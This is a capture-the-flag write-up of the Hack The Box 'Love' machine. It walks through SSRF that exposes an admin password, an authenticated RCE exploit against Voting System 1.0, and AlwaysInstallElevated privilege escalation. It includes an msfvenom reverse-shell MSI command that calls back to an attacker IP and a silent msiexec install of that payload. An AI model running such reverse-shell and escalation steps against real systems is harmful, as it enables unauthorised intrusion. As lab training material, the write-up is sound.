---
title: HTB-Love
draft: false
tags:
  - htb
  - windows
  - ssrf
  - voting-system
  - alwaysinstallelevated
  - msfvenom
  - easy
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/Love.png)



## Information Gathering
### Rustscan

Rustscan finds bunch of ports open. Some of them I am not sure what they are used for, I would have to look in to it:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/love]
└─$ rustscan --addresses 10.10.10.239 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com
<snip>
Host is up, received syn-ack (0.37s latency).
Scanned at 2024-04-24 13:04:31 EDT for 3s

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
443/tcp   open  https        syn-ack
445/tcp   open  microsoft-ds syn-ack
3306/tcp  open  mysql        syn-ack
5000/tcp  open  upnp         syn-ack
5040/tcp  open  unknown      syn-ack
5985/tcp  open  wsman        syn-ack
5986/tcp  open  wsmans       syn-ack
7680/tcp  open  pando-pub    syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack
49670/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.68 seconds
```

## Enumeration
### SMB - TCP 445

Null login is not allowed:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image.png)


### HTTP(s) - TCP 80 & 443

Website shows a login portal for Voting System:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-1.png)

Searchsploit finds several exploits for Voting System. I will look more into this later:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-3.png)

After directory bruteforcing and enumeration, I found several more paths on the website:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-4.png)

`/admin` is definetly an interesting path.


HTTPs shows forbidden page:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-2.png)

However I can still obtain subdomain information from it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-5.png)

## staging.love.htb - TCP 80

`http://staging.love.htb` shows a different page from Voting System:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-7.png)

Clicking on **Demo** directs me to **beta.php** where I can submit file url for scanning:

`http://staging.love.htb/beta.php`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-8.png)

I will try making connection to my local Kali machine:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-9.png)

You can see that connection is being made from the website:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-10.png)

I tried uploading webshell but it won't work since the webapp seems to be not reading the php script:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-11.png)

## Shell as phoebe
### SSRF

Instead of uploading web shell, I wil try accessing internal service running on port 5000:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-12.png)

I can access port 5000 through SSRF and read password for the admin: **@LoveIsInTheAir!!!!**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-13.png)

Weirdly, using the credential won't work on login portal:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-14.png)

However, through `/admin` page, I can successfully sign-in:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-15.png)


### Authenticated RCE

Voting system 1.0 seems to be vulnerable to Authenticated RCE. 


After downloading [payload](https://www.exploit-db.com/exploits/49445), I will edit my setting as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-16.png)

I will also edit the vulnerable to url as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-17.png)

With the netcat listener running, I will run the payload:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-20.png)

On my netcat listener, I have reverse shell spawned as **phoebe**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-18.png)


## Privesc: phoebe to Administrator
### AlwaysInstallElevated

After starting smber server through `impacket-smbserver share $(pwd) -smb2support` on the directory where there is winpeas.exe, I will download winpeas to target machine through `copy \\10.10.14.21\share\winpeas.ps1 winpeas.ps1`.

WinPEAS finds AlwaysInstallElevated running:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-21.png)

AlwaysInstallElevated is a setting in the Windows registry that, when enabled, allows non-administrative users to install programs with elevated privileges. This setting is intended for system administrators who want to ensure that certain programs are always installed with administrative rights, regardless of the user's permissions.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-22.png)

I will create payload that will make a reverse shell connection using msfvenom:

`msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=1338 -f msi -o rev_shell.msi`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-24.png)

I will the run the payload msi with netcat listener running on my local Kali machine:

`msiexec /quiet /qn /i rev_shell.msi`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-25.png)

Now I have a shell as the system:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/love/image-23.png)

## References
- https://www.exploit-db.com/exploits/49445
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
- https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/